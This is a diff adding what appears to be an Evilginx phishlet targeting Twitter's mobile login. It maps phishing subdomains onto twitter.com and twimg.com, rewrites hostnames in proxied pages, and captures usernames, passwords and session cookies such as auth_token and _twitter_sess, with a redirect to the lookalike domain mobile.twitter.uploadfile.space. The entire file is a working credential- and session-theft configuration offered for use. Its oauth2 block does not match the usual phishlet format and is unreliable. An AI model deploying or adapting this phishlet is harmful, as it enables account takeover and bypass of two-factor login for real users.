@@ -1,0 +1,39 @@
+author: '@white_fi'
+min_ver: '3.0.0'
+redirect_url: 'https://mobile.twitter.com/home'
+proxy_hosts:
+  - {phish_sub: 'mobile', orig_sub: 'mobile', domain: 'twitter.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'abs', orig_sub: 'abs', domain: 'twimg.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'twitter.com', session: false, is_landing: false, auto_filter: true}
+sub_filters:
+  - {triggers_on: 'mobile.twitter.com', orig_sub: 'mobile', domain: 'twitter.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'abs.twimg.com', orig_sub: 'abs', domain: 'twimg.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'api.twitter.com', orig_sub: 'api', domain: 'twitter.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript']}
+auth_tokens:
+  - domain: '.twitter.com'
+    keys: ['dnt:always','fm:always','kdt:always','_twitter_sess:always','twid:always','auth_token:always']
+    type: 'cookie'
+auth_urls:
+  - '/home'
+  - '/i/flow/login'
+credentials:
+  username:
+    key: 'session\[username_or_email\]'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'session\[password\]'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'mobile.twitter.com'
+  path: '/login'
+oauth2:
+  client_id: 'evilginx-proxy-twitter-mobile'
+  client_secret: 'f8a9b0c1d2e34567890abcdef1234567890abcdef1234567890abcdef1234567890'
+  redirect_uri: 'https://mobile.twitter.uploadfile.space'
+  authorization_endpoint: 'http://keycloak:8080/realms/evilginx/protocol/openid-connect/auth'
+  token_endpoint: 'http://keycloak:8080/realms/evilginx/protocol/openid-connect/token'
+  userinfo_endpoint: 'http://keycloak:8080/realms/evilginx/protocol/openid-connect/userinfo'
+  jwks_uri: 'http://keycloak:8080/realms/evilginx/protocol/openid-connect/certs'
+  scope: 'openid email profile offline_access evilginx-phishlet'
